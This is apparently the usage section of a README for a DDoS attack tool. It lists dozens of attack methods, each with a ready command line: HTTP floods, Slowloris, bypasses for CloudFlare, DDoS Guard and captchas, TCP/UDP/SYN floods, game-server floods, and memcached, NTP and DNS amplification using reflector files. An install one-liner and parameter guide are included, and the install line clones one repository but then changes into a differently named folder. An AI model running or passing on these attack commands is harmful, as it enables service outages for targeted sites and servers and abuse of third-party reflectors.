## Features And Methods

### Layer 7 (Application Layer) Methods

These attacks target web applications and services at the highest level of the OSI model.

* 💣 HTTP/HTTPS Methods:

   * <img src="https://img.icons8.com/cotton/344/domain.png" width="16" height="16" alt="get"> GET | GET Flood
   ```bash
   python3 start.py GET https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Floods the target with GET requests, overwhelming the server by requesting pages repeatedly.*

   * <img src="https://cdn0.iconfinder.com/data/icons/database-storage-5/60/server__database__fire__burn__safety-512.png" width="16" height="16" alt="post"> POST | POST Flood
   ```bash
   python3 start.py POST https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Sends numerous POST requests with random data, consuming server resources by forcing it to process the data.*

   * <img src="https://static-00.iconduck.com/assets.00/ovh-icon-2048x2048-l4c3izvg.png" width="16" height="16" alt="ovh"> OVH | Bypass OVH
   ```bash
   python3 start.py OVH https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Specialized method to bypass OVH's DDoS protection by mimicking legitimate traffic patterns.*

   * <img src="https://cdn-icons-png.flaticon.com/512/1691/1691948.png" width="16" height="16" alt="ovh"> RHEX | Random HEX
   ```bash
   python3 start.py RHEX https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Generates requests with random hexadecimal paths to bypass caching and security measures.*

   * <img src="https://cdn-icons-png.flaticon.com/512/4337/4337972.png" width="16" height="16" alt="ovh"> STOMP | Bypass chk_captcha
   ```bash
   python3 start.py STOMP https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Attempts to bypass captcha protection by manipulating request headers and patterns.*

   * <img src="https://cdn.iconscout.com/icon/premium/png-256-thumb/cyber-bullying-2557797-2152371.png" width="16" height="16" alt="stress"> STRESS | Send HTTP Packet With High Byte
   ```bash
   python3 start.py STRESS https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Sends large HTTP packets to stress server bandwidth and processing capabilities.*

   * <img src="https://pbs.twimg.com/profile_images/1351562987224641544/IKb4q_yd_400x400.jpg" width="16" height="16" alt="dyn"> DYN | A New Method With Random SubDomain
   ```bash
   python3 start.py DYN https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Generates requests to random subdomains, potentially bypassing DNS-based protection.*

   * <img src="https://cdn-icons-png.flaticon.com/512/6991/6991643.png" width="16" height="16" alt="downloader"> DOWNLOADER | A New Method of Reading data slowly
   ```bash
   python3 start.py DOWNLOADER https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Initiates downloads but reads data extremely slowly, keeping connections open and consuming server resources.*

   * <img src="https://cdn2.iconfinder.com/data/icons/poison-and-venom-fill/160/loris2-512.png" width="16" height="16" alt="slow"> SLOW | Slowloris Attack
   ```bash
   python3 start.py SLOW https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Maintains many slow, incomplete HTTP requests, eventually exhausting the server's connection pool.*

   * <img src="https://lyrahosting.com/wp-content/uploads/2020/06/ddos-how-work-icon.png" width="16" height="16" alt="head"> HEAD | HTTP HEAD Method
   ```bash
   python3 start.py HEAD https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Sends HEAD requests to obtain metadata without full content, efficiently consuming server resources.*

   * <img src="https://img.icons8.com/plasticine/2x/null-symbol.png" width="16" height="16" alt="null"> NULL | Null UserAgent and ...
   ```bash
   python3 start.py NULL https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Sends requests with null or empty fields to test server handling of malformed requests.*

   * <img src="https://i.pinimg.com/originals/03/2e/7d/032e7d0755cd511c753bcb6035d44f68.png" width="16" height="16" alt="cookie"> COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'
   ```bash
   python3 start.py COOKIE https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Floods with requests containing random cookies to overload cookie processing.*

   * <img src="https://cdn0.iconfinder.com/data/icons/dicticons-files-folders/32/office_pps-512.png" width="16" height="16" alt="pps"> PPS | Packets Per Second
   ```bash
   python3 start.py PPS https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Focuses on sending many small packets quickly to achieve high packets-per-second rates.*

   * <img src="https://cdn3.iconfinder.com/data/icons/internet-security-14/48/DDoS_website_webpage_bomb_virus_protection-512.png" width="16" height="16" alt="even"> EVEN | Enhanced GET
   ```bash
   python3 start.py EVEN https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Advanced GET method with additional headers to bypass common protections.*

   * <img src="https://iili.io/HU9BC74.png" width="16" height="16" alt="googleshield"> GSB | Google Shield Bypass
   ```bash
   python3 start.py GSB https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Specialized method to bypass Google's Project Shield protection.*

   * <img src="https://seeklogo.com/images/D/ddos-guard-logo-CFEFCA409C-seeklogo.com.png" width="16" height="16" alt="DDoSGuard"> DGB | DDoS Guard Bypass
   ```bash
   python3 start.py DGB https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Attempts to bypass DDoS Guard protection by emulating legitimate browser behavior.*

   * <img src="https://i.imgur.com/bGL8qfw.png" width="16" height="16" alt="ArvanCloud"> AVB | Arvan Cloud Bypass
   ```bash
   python3 start.py AVB https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Specialized method to bypass Arvan Cloud's protection systems.*

   * <img src="https://iili.io/HU9BC74.png" width="16" height="16" alt="Google bot"> BOT | Google Bot Emulation
   ```bash
   python3 start.py BOT https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Mimics Google bot behavior to bypass bot detection systems.*

   * <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Apache_HTTP_Server_Logo_%282016%29.svg/1000px-Apache_HTTP_Server_Logo_%282016%29.svg.png" width="16" height="16" alt="Apache Webserver"> APACHE | Apache Exploit
   ```bash
   python3 start.py APACHE https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Targets Apache server vulnerabilities using specific request patterns.*

   * <img src="https://icon-library.com/images/icon-for-wordpress/icon-for-wordpress-16.jpg" width="16" height="16" alt="wordpress exploit"> XMLRPC | WordPress XMLRPC Exploit
   ```bash
   python3 start.py XMLRPC https://example.com/xmlrpc.php 5 100 proxy.txt 64 120
   ```
   *Description: Exploits WordPress XMLRPC interface by sending multiple requests in a single HTTP request.*

   * <img src="https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730" width="16" height="16" alt="CloudFlare"> CFB | CloudFlare Bypass
   ```bash
   python3 start.py CFB https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Attempts to bypass CloudFlare protection using various techniques.*

   * <img src="https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730" width="16" height="16" alt="CloudFlare UnderAttack Mode"> CFBUAM | CloudFlare UAM Bypass
   ```bash
   python3 start.py CFBUAM https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Specifically targets CloudFlare's Under Attack Mode protection.*

   * <img src="http://iclouddnsbypass.com/wp-content/uploads/2015/02/iCloudDNSBypassServer.ico" width="16" height="16" alt="bypass"> BYPASS | Protection Bypass
   ```bash
   python3 start.py BYPASS https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: General-purpose method to bypass standard DDoS protections.*

   * <img src="https://cdn-icons-png.flaticon.com/512/905/905568.png" width="16" height="16" alt="bypass"> BOMB | Bombardier Tool
   ```bash
   python3 start.py BOMB https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Uses the bombardier tool for high-performance HTTP(S) benchmarking.*

   * 🔪 KILLER | Multi-threaded Attack
   ```bash
   python3 start.py KILLER https://example.com 5 100 proxy.txt 64 120
   ```
   *Description: Launches multiple aggressive threads to overwhelm the target.*

   * 🧅 TOR | Onion Network Attack
   ```bash
   python3 start.py TOR https://example.onion 5 100 proxy.txt 64 120
   ```
   *Description: Specialized method for attacking .onion services through the Tor network.*

### Layer 4 (Transport Layer) Methods

These attacks target the networking protocols directly.

* 🧨 TCP/UDP Based:
  * <img src="https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-logo-512.png" width="16" height="16" alt="tcp"> TCP | TCP Flood
  ```bash
  python3 start.py TCP 1.1.1.1:80 100 120
  ```
  *Description: Floods target with TCP packets, exhausting connection handling capabilities.*

  * <img src="https://styles.redditmedia.com/t5_2rxmiq/styles/profileIcon_snoob94cdb09-c26c-4c24-bd0c-66238623cc22-headshot.png" width="16" height="16" alt="udp"> UDP | UDP Flood
  ```bash
  python3 start.py UDP 1.1.1.1:80 100 120
  ```
  *Description: Sends numerous UDP packets to overwhelm the target's network capacity.*

  * <img src="https://cdn-icons-png.flaticon.com/512/1918/1918576.png" width="16" height="16" alt="syn"> SYN | SYN Flood
  ```bash
  python3 start.py SYN 1.1.1.1:80 100 120
  ```
  *Description: Exploits TCP handshake by sending many SYN packets without completing connections.*

  * <img src="https://cdn-icons-png.flaticon.com/512/1017/1017466.png" width="16" height="16" alt="cps"> CPS | Connection Per Second
  ```bash
  python3 start.py CPS 1.1.1.1:80 100 120
  ```
  *Description: Focuses on creating many new connections per second to exhaust resources.*

  * <img src="https://icon-library.com/images/icon-ping/icon-ping-28.jpg" width="16" height="16" alt="icmp"> ICMP | Ping Flood
  ```bash
  python3 start.py ICMP 1.1.1.1:80 100 120
  ```
  *Description: Sends numerous ICMP echo requests to overwhelm network processing.*

  * <img src="https://s6.uupload.ir/files/1059643_g8hp.png" width="16" height="16" alt="connection"> CONNECTION | Connection Flood
  ```bash
  python3 start.py CONNECTION 1.1.1.1:80 100 120
  ```
  *Description: Maintains many open connections to exhaust server connection limits.*

### Game Server Attacks

  * <img src="https://ia803109.us.archive.org/27/items/source-engine-video-projects/source-engine-video-projects_itemimage.png" width="16" height="16" alt="vse"> VSE | Valve Source Engine
  ```bash
  python3 start.py VSE 1.1.1.1:80 100 120
  ```
  *Description: Targets Source engine based game servers with specific protocol attacks.*

  * <img src="https://mycrackfree.com/wp-content/uploads/2018/08/TeamSpeak-Server-9.png" width="16" height="16" alt="teamspeak 3"> TS3 | TeamSpeak3
  ```bash
  python3 start.py TS3 1.1.1.1:80 100 120
  ```
  *Description: Floods TeamSpeak3 servers with status requests.*

  * <img src="https://cdn2.downdetector.com/static/uploads/logo/75ef9fcabc1abea8fce0ebd0236a4132710fcb2e.png" width="16" height="16" alt="fivem"> FIVEM | FiveM Game Server
  ```bash
  python3 start.py FIVEM 1.1.1.1:80 100 120
  ```
  *Description: Targets FiveM game servers with protocol-specific attacks.*

### Amplification Attacks

These methods use vulnerable servers to amplify the attack traffic.

  * <img src="https://cdn.iconscout.com/icon/free/png-512/redis-4-1175103.png" width="16" height="16" alt="mem"> MEM | Memcached
  ```bash
  python3 start.py MEM 1.1.1.1:80 100 120 reflector.txt
  ```
  *Description: Uses memcached servers to amplify attack traffic by up to 51,200 times.*

  * <img src="https://lyrahosting.com/wp-content/uploads/2020/06/ddos-attack-icon.png" width="16" height="16" alt="ntp"> NTP | Network Time Protocol
  ```bash
  python3 start.py NTP 1.1.1.1:80 100 120 reflector.txt
  ```
  *Description: Exploits NTP servers to amplify traffic by up to 556 times.*

### Minecraft Server Attacks

  * <img src="https://cdn-icons-png.flaticon.com/512/4712/4712139.png" width="16" height="16" alt="mcbot"> MCBOT | Minecraft Bot
  ```bash
  python3 start.py MCBOT 1.1.1.1:25565 100 120
  ```
  *Description: Floods Minecraft servers with bot connections and chat messages.*

  * <img src="https://cdn.icon-icons.com/icons2/2699/PNG/512/minecraft_logo_icon_168974.png" width="16" height="16" alt="minecraft"> MINECRAFT | Server Status
  ```bash
  python3 start.py MINECRAFT 1.1.1.1:25565 100 120
  ```
  *Description: Spams Minecraft servers with status ping requests.*

  * <img src="https://cdn.icon-icons.com/icons2/2699/PNG/512/minecraft_logo_icon_168974.png" width="16" height="16" alt="minecraft pe"> MCPE | Minecraft PE
  ```bash
  python3 start.py MCPE 1.1.1.1:19132 100 120
  ```
  *Description: Targets Minecraft Pocket Edition servers with specific protocol attacks.*

### Other Amplification Methods

  * <img src="https://cdn-icons-png.flaticon.com/512/2653/2653461.png" width="16" height="16" alt="dns"> DNS | Domain Name System
  ```bash
  python3 start.py DNS 1.1.1.1:53 100 120 reflector.txt
  ```
  *Description: Uses DNS servers to amplify traffic by up to 54 times.*

  * <img src="https://lyrahosting.com/wp-content/uploads/2020/06/ddos-attack-icon.png" width="16" height="16" alt="chargen"> CHAR | Character Generator
  ```bash
  python3 start.py CHAR 1.1.1.1:19 100 120 reflector.txt
  ```
  *Description: Exploits CHARGEN protocol to generate amplified traffic.*

  * <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRct5OvjSCpUftyRMm3evgdPOa-f8LbwJFO-A&usqp=CAU" width="16" height="16" alt="cldap"> CLDAP | Connection-less LDAP
  ```bash
  python3 start.py CLDAP 1.1.1.1:389 100 120 reflector.txt
  ```
  *Description: Uses CLDAP servers for traffic amplification up to 56-70 times.*

  * <img src="https://help.apple.com/assets/6171BD2C588E52621824409D/6171BD2D588E5262182440A4/en_US/8b631353e070420f47530bf95f1a7fae.png" width="16" height="16" alt="ard"> ARD | Apple Remote Desktop
  ```bash
  python3 start.py ARD 1.1.1.1:3283 100 120 reflector.txt
  ```
  *Description: Exploits ARD protocol for amplification attacks.*

  * <img src="https://www.tenforums.com/geek/gars/images/2/types/thumb__emote__esktop__onnection.png" width="16" height="16" alt="rdp"> RDP | Remote Desktop Protocol
  ```bash
  python3 start.py RDP 1.1.1.1:3389 100 120 reflector.txt
  ```
  *Description: Uses RDP servers to amplify attack traffic.*

### Utility Tools

* ⚙️ Tools - Runs With `python3 start.py tools`
  * 🌟 CFIP | Find Real IP Address Of Websites Powered By Cloudflare
  * 🔪 DNS | Show DNS Records Of Sites
  * 📍 TSSRV | TeamSpeak SRV Resolver
  * ⚠ PING | PING Servers
  * 📌 CHECK | Check If Websites Status
  * 😎 DSTAT | That Shows Bytes Received, bytes Sent and their amount

### Other Functions

* 🎩 Other
  * ❌ STOP | STOP All Attacks
  * 🌠 TOOLS | Console Tools
  * 👑 HELP | Show Usage Script

### Installation
```bash
apt -y update && apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git && git clone https://github.com/Ilyes009/PyRoxy.git && cd MH* && pip3 install -r requirements.txt
```

### Command Format Examples

1. Layer7 (HTTP/HTTPS) Attack:
```bash
python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>
```

2. Layer4 (TCP/UDP) Attack:
```bash
python3 start.py <method> <ip:port> <threads> <duration>
```

3. Layer4 with Proxy:
```bash
python3 start.py <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
```

4. Layer4 Amplification Attack:
```bash
python3 start.py <method> <ip:port> <threads> <duration> <reflector file>
```

### Parameters Explanation
- `method`: Attack method from the list above
- `url/ip:port`: Target URL or IP:PORT
- `socks_type`: Proxy type (4=SOCKS4, 5=SOCKS5, 1=HTTP)
- `threads`: Number of threads
- `proxylist`: File with proxies
- `rpc`: Rate per connection
- `duration`: Attack duration in seconds
- `reflector file`: File with amplification servers (only for amplification attacks)
